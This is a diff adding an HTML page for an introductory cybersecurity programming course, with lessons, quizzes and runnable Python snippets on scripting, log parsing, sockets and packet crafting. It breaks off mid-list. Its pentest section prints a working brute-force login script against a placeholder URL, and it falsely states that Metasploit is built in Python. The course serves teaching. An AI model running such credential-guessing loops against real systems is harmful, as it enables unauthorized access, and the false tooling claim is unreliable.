@@ -1,0 +1,2525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Programming in Cybersecurity Basics</title>
+    <script type="text/javascript" src="../course_script/function.js" defer></script>
+    <link rel="stylesheet" type="text/css" href="../CSS/course_styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.10/codemirror.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.10/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.10/mode/python/python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.10/mode/javascript/javascript.min.js"></script>
+    </head>
+<body>
+    <header>
+        <h1>Programming </h1>
+        <div class="rewards">
+        <div id="rewards">
+            Rewards: <span>0</span> points
+        </div>
+        <div id="hearts">
+            Hearts: <span class="heart">❤️</span> <span class="heart">❤️</span> <span class="heart">❤️</span>
+        </div>
+        </div>
+   </header>
+   <div class="course">
+
+<section>
+    <h2>1. Understanding Programming Languages</h2>
+    
+    <article>
+        <h3 course-id="p1" class="locked">1.1 High-Level vs. Low-Level Languages</h3>
+        <div class="theory p1">
+            <div class="course-container">
+                <h4>High-Level Languages:</h4>
+                <p><strong>Definition:</strong> High-level languages are designed to be easy for humans to read and write. They abstract away the complexities of the underlying hardware, enabling developers to focus on logic and functionality rather than hardware details.</p>
+                
+                <h4>Characteristics:</h4>
+                <ul>
+                    <li><strong>Abstraction:</strong> High-level languages provide a significant level of abstraction from the hardware, allowing developers to use complex operations with simple syntax.</li>
+                    <li><strong>Readability:</strong> Code written in high-level languages is generally more readable and maintainable. For example, Python’s syntax resembles natural language, which can be intuitive for beginners.</li>
+                    <li><strong>Portability:</strong> High-level languages are often platform-independent; they can run on various types of hardware with minimal modification.</li>
+                </ul>
+                
+                <h4>Examples:</h4>
+                <ul>
+                    <li><strong>Python:</strong> Known for its simplicity and readability, Python is widely used for scripting, automation, and various applications in cybersecurity.</li>
+                    <li><strong>Java:</strong> Object-oriented and widely used in enterprise environments, Java is important for building secure applications and understanding web security.</li>
+                    <li><strong>C++:</strong> Offers object-oriented features and is used in system software, game development, and performance-critical applications.</li>
+                </ul>
+
+                <h4>Low-Level Languages:</h4>
+                <p><strong>Definition:</strong> Low-level languages provide little abstraction from a computer's instruction set architecture. This allows developers to write programs that are closely tied to the hardware.</p>
+                
+                <h4>Characteristics:</h4>
+                <ul>
+                    <li><strong>Control:</strong> Low-level languages allow for direct manipulation of hardware resources, enabling fine-tuned performance and optimization.</li>
+                    <li><strong>Complexity:</strong> Code written in low-level languages can be harder to read and maintain due to its intricate nature.</li>
+                    <li><strong>Hardware Specificity:</strong> Programs are often specific to a particular architecture and may require significant modification to run on different hardware.</li>
+                </ul>
+
+                <h4>Examples:</h4>
+                <ul>
+                    <li><strong>Assembly Language:</strong> Provides a symbolic representation of a computer's machine code, allowing for direct control over hardware. It is often used in situations requiring high performance or low-level access.</li>
+                    <li><strong>C:</strong> Offers a balance between high-level functionality and low-level control. It is widely used in system programming, embedded systems, and developing operating systems.</li>
+                </ul>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="p1">
+                <div class="question">
+                    <label for="q1"><h5>Question:</h5> Which of the following is a characteristic of high-level languages?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q1' class="task-form">
+                        <input type="radio" name="task1" value="wrong"> They provide little abstraction from the hardware.<br>
+                        <input type="radio" name="task1" value="correct"> They are generally more readable and maintainable.<br>
+                        <input type="radio" name="task1" value="wrong"> They are specific to a particular architecture.<br>
+                        <span class="feedback" id="q1-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p2 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article>
+        <h3 course-id="p2" class="locked">1.2 Popular Languages for Cybersecurity</h3>
+        <div class="theory p2">
+            <div class="course-container">
+                <h4>1. Python</h4>
+                <p><strong>Usage:</strong> Python is a go-to language for cybersecurity professionals. Its extensive libraries facilitate various tasks:</p>
+                <ul>
+                    <li><strong>Scripting and Automation:</strong> Automating repetitive tasks, such as log analysis and network monitoring.</li>
+                    <li><strong>Penetration Testing Tools:</strong> Popular tools like Metasploit and Scapy are built using Python, making it essential for ethical hacking.</li>
+                    <li><strong>Libraries:</strong> Libraries like Scapy for packet manipulation, Requests for HTTP requests, and Cryptography for secure communication.</li>
+                </ul>
+
+                <h4>2. C and C++</h4>
+                <p><strong>Usage:</strong> These languages are crucial for low-level programming and understanding system internals:</p>
+                <ul>
+                    <li><strong>Exploits and Malware:</strong> Many exploits and malware are written in C or C++ due to their ability to interact directly with system resources.</li>
+                    <li><strong>System Programming:</strong> Writing operating systems and performance-critical applications.</li>
+                    <li><strong>Understanding Vulnerabilities:</strong> Knowledge of C/C++ helps cybersecurity professionals understand common vulnerabilities like buffer overflows.</li>
+                </ul>
+
+                <h4>3. JavaScript</h4>
+                <p><strong>Usage:</strong> JavaScript plays a vital role in web security:</p>
+                <ul>
+                    <li><strong>Client-Side Logic:</strong> Understanding JavaScript helps identify vulnerabilities in web applications, especially cross-site scripting (XSS).</li>
+                    <li><strong>Security Testing:</strong> Tools like OWASP ZAP utilize JavaScript for testing web applications for vulnerabilities.</li>
+                    <li><strong>Frameworks and Libraries:</strong> Familiarity with libraries like Node.js can aid in backend security assessments.</li>
+                </ul>
+
+                <h4>4. Bash/Shell Scripting</h4>
+                <p><strong>Usage:</strong> Essential for automating tasks and managing Unix/Linux systems:</p>
+                <ul>
+                    <li><strong>System Administration:</strong> Automating administrative tasks such as user management and system updates.</li>
+                    <li><strong>Incident Response:</strong> Quick scripting to gather logs, analyze system states, and respond to incidents.</li>
+                    <li><strong>Tool Integration:</strong> Many security tools can be executed through shell scripts, enhancing operational efficiency.</li>
+                </ul>
+
+                <h4>5. PowerShell</h4>
+                <p><strong>Usage:</strong> A powerful scripting language for Windows environments:</p>
+                <ul>
+                    <li><strong>Automation:</strong> Automates administrative tasks, from managing users to system configurations.</li>
+                    <li><strong>Penetration Testing:</strong> Frequently used in security assessments, allowing testers to manipulate Windows environments efficiently.</li>
+                    <li><strong>Incident Response:</strong> Collecting system information, managing processes, and interacting with system APIs for quick responses to security incidents.</li>
+                </ul>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="p2">
+                <div class="question">
+                    <label for="q2"><h5>Question:</h5> Which programming language is widely recognized for its role in automation and scripting in cybersecurity?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q2' class="task-form">
+                        <input type="radio" name="task2" value="correct"> Python<br>
+                        <input type="radio" name="task2" value="wrong"> Java<br>
+                        <input type="radio" name="task2" value="wrong"> Assembly Language<br>
+                        <span class="feedback" id="q2-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p2 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+</section>
+
+<section>
+    <h2>2. Basic Programming Concepts</h2>
+
+    <article>
+        <h3 course-id="p3" class="locked">2.1 Variables and Data Types</h3>
+        <div class="theory p3">
+            <div class="course-container">
+                <h4>Variables:</h4>
+                <p>Variables are used to store data values. They act as containers for information that can be changed during program execution. Naming conventions (e.g., meaningful names) improve code readability.</p>
+
+                <h4>Data Types:</h4>
+                <p>Different types of data are essential for effective programming. Common data types include:</p>
+                <ul>
+                    <li><strong>Integers:</strong> Whole numbers, used for counting or indexing.</li>
+                    <li><strong>Floating Point Numbers:</strong> Numbers with decimal points, useful for precision in calculations (e.g., financial data).</li>
+                    <li><strong>Strings:</strong> Sequences of characters, used for text manipulation (e.g., usernames, messages).</li>
+                    <li><strong>Booleans:</strong> Represent true or false values, essential for control structures and decision-making.</li>
+                </ul>
+
+                <p>Understanding how to use these data types allows programmers to manipulate and perform operations on data efficiently, which is crucial in tasks like validating user input or processing network requests.</p>
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Define a variable and print its value:</p>
+                    <textarea id="variables-code" rows="5" cols="50"># Example code
+name = "Alice"
+age = 30
+is_active = True
+print(name, age, is_active)</textarea><br>
+                    <button onclick="executeCode('variables-code')">Run Code</button>
+                    <pre id="variables-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="p3">
+                <div class="question">
+                    <label for="q3"><h5>Question:</h5> What type of data is used to represent true or false values?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q3' class="task-form">
+                        <input type="radio" name="task3" value="wrong"> Strings<br>
+                        <input type="radio" name="task3" value="correct"> Booleans<br>
+                        <input type="radio" name="task3" value="wrong"> Integers<br>
+                        <span class="feedback" id="q3-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p3 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article>
+        <h3 course-id="p4" class="locked">2.2 Control Structures</h3>
+        <div class="theory p4">
+            <div class="course-container">
+                <h4>1. Conditionals (if, else)</h4>
+                <p><strong>Purpose:</strong> Conditionals enable decision-making in programs by executing different code paths based on specific conditions.</p>
+                <h4>Syntax Example:</h4>
+                <pre>
+if condition:
+    # Code to execute if condition is true
+else:
+    # Code to execute if condition is false
+                </pre>
+                <h4>Application in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Security Automation:</strong> For instance, a script could analyze network traffic and trigger alerts when suspicious patterns are detected.</li>
+                    <li><strong>Access Control:</strong> Conditional statements can check user roles before granting access to certain resources.</li>
+                </ul>
+
+                <h4>2. Loops (for, while)</h4>
+                <p><strong>Purpose:</strong> Loops allow for repeated execution of a block of code until a specified condition is met, facilitating automation of repetitive tasks.</p>
+                <h4>Syntax Example:</h4>
+                <pre>
+for i in range(10):
+    # Code to execute 10 times
+
+while condition:
+    # Code to execute while condition is true
+                </pre>
+                <h4>Application in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Scanning IP Addresses:</strong> Automating the process of checking the security of multiple IP addresses in a network.</li>
+                    <li><strong>Log Analysis:</strong> Continuously monitoring logs for anomalies or patterns over time.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Write a conditional statement to check if a number is even or odd:</p>
+                    <textarea id="conditionals-code" rows="5" cols="50"># Example code
+number = 10
+if number % 2 == 0:
+    print("Even")
+else:
+    print("Odd")</textarea><br>
+                    <button onclick="executeCode('conditionals-code')">Run Code</button>
+                    <pre id="conditionals-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="p4">
+                <div class="question">
+                    <label for="q4"><h5>Question:</h5> What is the purpose of conditional statements in programming?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q4' class="task-form">
+                        <input type="radio" name="task4" value="correct"> To make decisions based on conditions.<br>
+                        <input type="radio" name="task4" value="wrong"> To repeat a block of code.<br>
+                        <input type="radio" name="task4" value="wrong"> To store values.<br>
+                        <span class="feedback" id="q4-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p4 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article>
+        <h3 course-id="p5" class="locked">2.3 Functions and Procedures</h3>
+        <div class="theory p5">
+            <div class="course-container">
+                <h4>Functions:</h4>
+                <p>Functions are reusable blocks of code that perform a specific task. They can take inputs (parameters) and return outputs (results).</p>
+                <h4>Syntax Example:</h4>
+                <pre>
+def function_name(parameters):
+    # Code to execute
+    return result
+                </pre>
+                <h4>Application in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Modularity:</strong> Breaking down complex tasks (e.g., analyzing logs, validating user inputs) into smaller, manageable functions enhances code organization and readability.</li>
+                    <li><strong>Reusability:</strong> Functions can be reused across different projects, saving time and reducing errors.</li>
+                </ul>
+
+                <h4>Procedures:</h4>
+                <p>Similar to functions but generally do not return values. They are used for executing a series of statements.</p>
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Create a function that calculates the square of a number:</p>
+                    <textarea id="functions-code" rows="5" cols="50"># Example code
+def square(num):
+    return num * num
+
+result = square(4)
+print(result)</textarea><br>
+                    <button onclick="executeCode('functions-code')">Run Code</button>
+                    <pre id="functions-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="p5">
+                <div class="question">
+                    <label for="q5"><h5>Question:</h5> What do functions do in programming?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q5' class="task-form">
+                        <input type="radio" name="task5" value="correct"> Perform a specific task and can return a value.<br>
+                        <input type="radio" name="task5" value="wrong"> Store values in memory.<br>
+                        <input type="radio" name="task5" value="wrong"> Control the flow of the program.<br>
+                        <span class="feedback" id="q5-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p5 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article>
+        <h3 course-id="p6" class="locked">2.4 File Handling</h3>
+        <div class="theory p6">
+            <div class="course-container">
+                <h4>Purpose:</h4>
+                <p>File handling refers to the ability to read from and write to files, which is essential for managing data in programs.</p>
+                <h4>Basic Operations:</h4>
+                <ul>
+                    <li><strong>Reading Files:</strong> Accessing data stored in files, such as configuration files or logs.</li>
+                    <li><strong>Writing Files:</strong> Creating or modifying files to store data, such as logging events or saving results of a security scan.</li>
+                </ul>
+                <h4>Syntax Example:</h4>
+                <pre>
+# Reading from a file
+with open('filename.txt', 'r') as file:
+    data = file.read()
+
+# Writing to a file
+with open('filename.txt', 'w') as file:
+    file.write('Hello, World!')
+                </pre>
+                <h4>Application in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Log Analysis:</strong> Reading and analyzing logs to identify security breaches or unauthorized access attempts.</li>
+                    <li><strong>Malware Scanning:</strong> Scanning files for malicious code, making file handling critical for developing antivirus software.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Write code to read from a file and print its contents:</p>
+                    <textarea id="file-handling-code" rows="5" cols="50"># Example code
+with open('testfile.txt', 'r') as file:
+    content = file.read()
+    print(content)</textarea><br>
+                    <button onclick="executeCode('file-handling-code')">Run Code</button>
+                    <pre id="file-handling-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+            <div class="task" task-id="basic-programming-4">
+                <div class="question">
+                    <label for="q6"><h5>Question:</h5> Why is file handling important in programming?</label><br>
+                    <p>Select the one that applies:</p>
+                    <form id='q6' class="task-form">
+                        <input type="radio" name="task6" value="correct"> It allows programs to manage data efficiently.<br>
+                        <input type="radio" name="task6" value="wrong"> It makes code run faster.<br>
+                        <input type="radio" name="task6" value="wrong"> It simplifies user interfaces.<br>
+                        <span class="feedback" id="q6-feedback"></span>
+                    </form>
+                    <div class="actions">
+                        <button class="check">Check answers</button>
+                        <div class="hint-p6 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                        <div class="nextsection"><strong>Next >></strong></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+</section>
+
+
+
+
+<section>
+    <h2>3. Scripting and Automation</h2>
+
+    <article>
+        <h3 course-id="p7" class="locked">3.1 Task Automation</h3>
+        <div class="theory p7">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Task automation involves writing scripts to perform repetitive or time-consuming tasks automatically. This enhances efficiency and reduces human error.</p>
+
+                <h4>Common Uses:</h4>
+                <ul>
+                    <li><strong>Network Scanning:</strong> Automated scripts can be written to scan networks for open ports, active hosts, or vulnerabilities.</li>
+                    <li><strong>User Account Management:</strong> Scripts can manage user accounts, such as creating, modifying, or deleting user accounts in bulk.</li>
+                    <li><strong>Log Searching:</strong> Automating the process of searching logs for specific events, reducing the time spent manually reviewing logs.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre>
+import os
+
+# Automating network scans using nmap
+os.system('nmap -sP 192.168.1.0/24')  # Scans the local network for active hosts
+                </pre>
+
+                <h4>Benefits:</h4>
+                <ul>
+                    <li>Increases operational efficiency by freeing up time for security analysts to focus on more complex tasks.</li>
+                    <li>Ensures consistency in processes, minimizing the risk of oversight or mistakes during manual operations.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Write a script to automate a simple task (like printing a message):</p>
+                    <textarea id="task-automation-code" rows="5" cols="50"># Example code
+print("Automated task executed!")</textarea><br>
+                    <button onclick="executeCode('task-automation-code')">Run Code</button>
+                    <pre id="task-automation-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+        <div class="task" task-id="p7">
+            <div class="question">
+                <label for="q7"><h5>Question:</h5> What is one benefit of automating repetitive tasks?</label><br>
+                <form id='q7' class="task-form">
+                    <input type="radio" name="task7" value="wrong"> It decreases the efficiency of operations.<br>
+                    <input type="radio" name="task7" value="correct"> It frees up time for security analysts.<br>
+                    <input type="radio" name="task7" value="wrong"> It increases manual errors.<br>
+                    <span class="feedback" id="q7-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p7 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    <article>
+        <h3 course-id="p8" class="locked">3.2 Log Analysis</h3>
+        <div class="theory p8">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Log analysis involves using scripts to process and analyze large volumes of log data to identify patterns, anomalies, or security incidents.</p>
+
+                <h4>Common Tasks:</h4>
+                <ul>
+                    <li><strong>Parsing Logs:</strong> Extracting relevant information from raw log files, such as timestamps, IP addresses, and error messages.</li>
+                    <li><strong>Identifying Unusual Activity:</strong> Analyzing logs for signs of unauthorized access, data exfiltration, or other security threats.</li>
+                    <li><strong>Indicators of Compromise (IOCs):</strong> Searching for known IOCs (e.g., specific IP addresses or signatures) that indicate a breach.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre>
+import re
+
+# Simple log parser to find failed login attempts
+with open('auth.log', 'r') as file:
+    for line in file:
+        if re.search(r'Failed password for', line):
+            print(line)  # Output failed login attempts
+                </pre>
+
+                <h4>Benefits:</h4>
+                <ul>
+                    <li>Helps security teams quickly identify potential security breaches or misconfigurations.</li>
+                    <li>Enables organizations to respond to incidents promptly and efficiently by providing insights from log data.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Write a simple log parser that looks for specific patterns in text:</p>
+                    <textarea id="log-analysis-code" rows="5" cols="50"># Example code
+sample_log = "Failed password for user admin"
+if "Failed password" in sample_log:
+    print("Failed login detected!")</textarea><br>
+                    <button onclick="executeCode('log-analysis-code')">Run Code</button>
+                    <pre id="log-analysis-output"></pre>
+                </div>
+                <div class="next"><strong>Next >></strong></div>
+            </div>
+
+        <div class="task" task-id="p8">
+            <div class="question">
+                <label for="q8"><h5>Question:</h5> What is one of the main goals of log analysis?</label><br>
+                <form id='q8' class="task-form">
+                    <input type="radio" name="task8" value="wrong"> To manually search logs without scripts.<br>
+                    <input type="radio" name="task8" value="correct"> To identify potential security breaches by analyzing logs.<br>
+                    <input type="radio" name="task8" value="wrong"> To ignore unauthorized access patterns.<br>
+                    <span class="feedback" id="q8-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p8 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    <article>
+        <h3 course-id="p9" class="locked">3.3 Penetration Testing Tools</h3>
+        <div class="theory p9">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Penetration testing involves simulating real-world attacks on systems to identify vulnerabilities. Custom tools and scripts are often developed to assist in this process.</p>
+
+                <h4>Common Tasks:</h4>
+                <ul>
+                    <li><strong>Vulnerability Scanning:</strong> Writing scripts that automate the process of scanning systems for known vulnerabilities.</li>
+                    <li><strong>Brute-Force Attacks:</strong> Developing custom scripts to attempt various combinations of usernames and passwords to gain unauthorized access.</li>
+                    <li><strong>Simulating Attacks:</strong> Creating scripts that replicate the behavior of malicious actors, allowing organizations to test their defenses.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre>
+import requests
+
+# Example of a simple brute-force password cracker
+url = 'http://example.com/login'
+usernames = ['admin']
+passwords = ['password123', 'admin123', '123456']
+
+for username in usernames:
+    for password in passwords:
+        response = requests.post(url, data={'username': username, 'password': password})
+        if 'Login successful' in response.text:
+            print(f'Successful login with {username}:{password}')
+                </pre>
+
+                <h4>Benefits:</h4>
+                <ul>
+                    <li>Enables organizations to proactively identify and remediate vulnerabilities before they can be exploited by malicious actors.</li>
+                    <li>Custom tools can be tailored to specific environments, improving the effectiveness of penetration testing efforts.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Write a simple script to simulate a login attempt:</p>
+                    <textarea id="penetration-testing-code" rows="5" cols="50"># Example code
+username = "admin"
+password = "admin123"
+print(f'Trying login with {username}:{password}')</textarea><br>
+                    <button onclick="executeCode('penetration-testing-code')">Run Code</button>
+                    <pre id="penetration-testing-output"></pre>
+                </div>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        <div class="task" task-id="p9">
+            <div class="question">
+                <label for="q9"><h5>Question:</h5> Which task can be automated during penetration testing?</label><br>
+                <form id='q9' class="task-form">
+                    <input type="radio" name="task9" value="correct"> Scanning systems for known vulnerabilities.<br>
+                    <input type="radio" name="task9" value="wrong"> Deleting critical system files.<br>
+                    <input type="radio" name="task9" value="wrong"> Ignoring suspicious activities.<br>
+                    <span class="feedback" id="q9-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-p9 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+</section>
+
+
+
+<section>
+    <h2>4. Network Programming</h2>
+
+    <article>
+        <h3 course-id="p10" class="locked">4.1 Socket Programming</h3>
+        <div class="theory p10">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Socket programming involves creating and manipulating network connections using sockets, which serve as endpoints for sending and receiving data across a network. This foundational concept is crucial for network communication in various applications.</p>
+
+                <h4>Key Concepts:</h4>
+                <ul>
+                    <li><strong>Socket Types:</strong>
+                        <ul>
+                            <li><strong>Stream Sockets (TCP):</strong> Provide reliable, connection-oriented communication.</li>
+                            <li><strong>Datagram Sockets (UDP):</strong> Offer connectionless communication, useful for applications where speed is critical and reliability is less important.</li>
+                        </ul>
+                    </li>
+                    <li><strong>Socket API:</strong> The set of functions and methods used to create and manage sockets, including:
+                        <ul>
+                            <li><code>socket():</code> Creating a socket.</li>
+                            <li><code>bind():</code> Associating a socket with a specific IP address and port.</li>
+                            <li><code>listen():</code> Preparing a socket to accept incoming connections (for TCP).</li>
+                            <li><code>accept():</code> Accepting a connection request from a client.</li>
+                            <li><code>send()</code> and <code>recv():</code> Sending and receiving data through the socket.</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre>
+import socket
+
+# Creating a TCP socket
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind(('localhost', 8080))
+server_socket.listen(1)
+
+print("Waiting for a connection...")
+client_socket, client_address = server_socket.accept()
+print(f"Connection from {client_address} established!")
+
+# Receiving data from the client
+data = client_socket.recv(1024)
+print(f"Received: {data.decode()}")
+
+client_socket.close()
+server_socket.close()
+                </pre>
+
+                <h4>Applications in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Port Scanners:</strong> Tools that use socket programming to check which ports on a network are open and which services are running.</li>
+                    <li><strong>Packet Sniffers:</strong> Applications that capture and analyze network traffic, helping security analysts understand data flow and identify anomalies.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Create a simple socket client to connect to the server:</p>
+                    <textarea id="socket-client-code" rows="5" cols="50"># Example code
+import socket
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect(('localhost', 8080))
+client_socket.send(b'Hello, Server!')
+client_socket.close()</textarea><br>
+                    <button onclick="executeCode('socket-client-code')">Run Code</button>
+                    <pre id="socket-client-output"></pre>
+                </div>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        <div class="task" task-id="p10">
+            <div class="question">
+                <label for="q10"><h5>Question:</h5> What type of socket provides reliable communication?</label><br>
+                <form id='q10' class="task-form">
+                    <input type="radio" name="task10" value="correct"> Stream Sockets (TCP).<br>
+                    <input type="radio" name="task10" value="wrong"> Datagram Sockets (UDP).<br>
+                    <input type="radio" name="task10" value="wrong"> Both Stream and Datagram Sockets.<br>
+                    <span class="feedback" id="q10-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-10 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </article>
+
+    <article>
+        <h3 course-id="p11"  class="locked">4.2 Working with Protocols</h3>
+        <div class="theory p11">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Network protocols are standardized rules for data communication across networks. Familiarity with these protocols is essential for developing secure applications and analyzing network behavior.</p>
+
+                <h4>Common Protocols:</h4>
+                <ul>
+                    <li><strong>HTTP/HTTPS:</strong> The protocol used for web communication. Understanding how to interact with these protocols is vital for web security assessments, including web scraping and vulnerability scanning.</li>
+                    <li><strong>FTP:</strong> File Transfer Protocol used for transferring files. Knowledge of FTP is important for secure file transfers and identifying vulnerabilities in file-sharing applications.</li>
+                    <li><strong>DNS:</strong> Domain Name System, which translates domain names into IP addresses. Understanding DNS is crucial for detecting DNS spoofing or poisoning attacks.</li>
+                </ul>
+
+                <h4>Example (HTTP Request with Python):</h4>
+                <pre>
+import requests
+
+# Sending a GET request to a website
+response = requests.get('https://www.example.com')
+print(f"Response Status Code: {response.status_code}")
+print(f"Response Content: {response.text[:100]}")  # Print the first 100 characters of the response
+                </pre>
+
+                <h4>Applications in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Building Exploits:</strong> Understanding protocols helps security professionals craft exploits targeting vulnerabilities in those protocols.</li>
+                    <li><strong>Network Traffic Analysis:</strong> Analyzing and inspecting network traffic to identify malicious activity or data leaks.</li>
+                </ul>
+
+                <div class="try-it">
+                    <h5>Try It Out:</h5>
+                    <p>Send a GET request to a different URL:</p>
+                    <textarea id="http-request-code" rows="5" cols="50"># Example code
+response = requests.get('https://www.example.org')
+print(response.status_code)</textarea><br>
+                    <button onclick="executeCode('http-request-code')">Run Code</button>
+                    <pre id="http-request-output"></pre>
+                </div>
+            <div class="next"><strong>Next >></strong></div>
+        </div>
+
+        
+        <div class="task" task-id="working-with-protocols-1">
+            <div class="question">
+                <label for="q11"><h5>Question:</h5> What is the primary function of the DNS protocol?</label><br>
+                <form id='q11' class="task-form">
+                    <input type="radio" name="task11" value="correct"> Translating domain names into IP addresses.<br>
+                    <input type="radio" name="task11" value="wrong"> Transferring files over the internet.<br>
+                    <input type="radio" name="task11" value="wrong"> Sending emails between servers.<br>
+                    <span class="feedback" id="q11-feedback"></span>
+                </form>
+                <div class="actions">
+                    <button class="check">Check answers</button>
+                    <div class="hint-11 hint-image"><img src="../photos/hint.jfif" alt="Hint"></div>
+                    <div class="nextsection"><strong>Next >></strong></div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </article>
+
+    <article>
+        <h3 course-id="p12"  class="locked">4.3 Packet Manipulation</h3>
+        <div class="theory p12">
+            <div class="course-container">
+                <h4>Definition:</h4>
+                <p>Packet manipulation involves crafting, sending, and analyzing network packets to understand network behavior and test security measures.</p>
+
+                <h4>Tools:</h4>
+                <ul>
+                    <li><strong>Scapy:</strong> A powerful Python library for packet manipulation that allows users to create custom packets, send them over the network, and capture responses.</li>
+                </ul>
+
+                <h4>Key Features:</h4>
+                <ul>
+                    <li><strong>Crafting Packets:</strong> Users can build packets with specific headers and payloads tailored to their needs.</li>
+                    <li><strong>Sniffing Traffic:</strong> Scapy can capture packets on the network for analysis, helping identify patterns or suspicious activities.</li>
+                    <li><strong>Protocols Support:</strong> Scapy supports a wide range of protocols, allowing for detailed packet manipulation across different layers of the OSI model.</li>
+                </ul>
+
+                <h4>Example:</h4>
+                <pre>
+from scapy.all import *
+
+# Creating a custom ICMP (ping) packet
+packet = IP(dst='192.168.1.1')/ICMP()
+response = sr1(packet, timeout=2)
+
+if response:
+    print(f"Received response from {response[IP].src}")
+else:
+    print("No response received.")
+                </pre>
+
+                <h4>Applications in Cybersecurity:</h4>
+                <ul>
+                    <li><strong>Testing Firewalls and IDS/IPS:</strong> Crafting and sending specific packets to test the effectiveness of security devices in filtering or detecting malicious traffic.</li>
